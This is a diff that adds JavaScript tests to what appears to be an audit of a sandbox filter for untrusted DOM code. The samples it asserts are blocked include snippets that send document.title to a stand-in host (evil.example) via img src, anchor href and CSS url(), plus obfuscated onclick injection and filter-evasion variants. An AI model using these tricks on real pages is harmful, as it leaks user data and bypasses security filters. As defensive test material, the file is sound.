@@ -619,3 +619,68 @@ describe('audit of 00cc5f7 (#48): routes to the window and document values', () 
     }
   })
 })
+
+describe('audit of 00cc5f7 (#48): attribute nodes and namespaced tag selectors', () => {
+  const SNIPPETS = [
+    `const b = document.createElement('button'); b.toggleAttribute('onclick'); b.getAttributeNode('onclick').value = 'al' + 'ert(1)'; document.body.append(b); b.click()`,
+    `document.querySelector('img').getAttributeNode('src').value = 'https://evil.example/?' + document.title`,
+    `const a = document.createElement('a'); a.toggleAttribute('href'); a.getAttributeNode('href').nodeValue = 'https://evil.example/?' + document.title; a.click()`,
+    `const u = 'ur'; document.head.getElementsByTagNameNS('*', 'style')[0].textContent = 'body{background:' + u + 'l(https://evil.example/?' + document.title + ')}'`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks every way to get an attribute as a node', () => {
+    for (const source of [
+      `document.body.getAttributeNode('title')`,
+      `document.body.getAttributeNodeNS(null, 'title')`,
+      `document.body.setAttributeNode(document.createAttribute('title'))`,
+      `document.body.attributes[0].value`,
+      `const { getAttributeNode } = document.body`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('checks toggleAttribute names the way setAttribute names are checked', () => {
+    for (const source of [
+      `document.body.toggleAttribute('onclick')`,
+      `document.body.toggleAttribute('onmouseover', true)`,
+      `document.body.toggleAttribute('href')`,
+      `document.body.toggleAttribute('src', true)`,
+      `document.body.toggleAttribute('srcdoc')`,
+      `document.body.toggleAttribute('http-equiv')`,
+      `const n = 'x'; document.body.toggleAttribute(n)`,
+      `const t = document.body.toggleAttribute; t.call(document.body, 'onclick')`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+    // Declared network use unlocks an address attribute, as for setAttribute.
+    expect(blocks(`document.body.toggleAttribute('href')`, ['network'])).toBe(false)
+    expect(blocks(`document.body.toggleAttribute('onclick')`, ['network'])).toBe(true)
+  })
+
+  it('checks the tag name of every selector method that takes one', () => {
+    for (const source of [
+      `document.body.getElementsByTagNameNS('*', 'script')`,
+      `document.body.getElementsByTagNameNS('http://www.w3.org/1999/xhtml', 'style')`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('controls: ordinary attribute toggles and namespaced selectors still pass', () => {
+    for (const source of [
+      `document.body.toggleAttribute('hidden')`,
+      `document.body.toggleAttribute('data-wa', true)`,
+      `document.body.toggleAttribute('aria-hidden', false)`,
+      `document.body.getElementsByTagNameNS('*', 'div')`,
+      `document.body.getElementsByTagNameNS('http://www.w3.org/2000/svg', 'path')`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+  })
+})
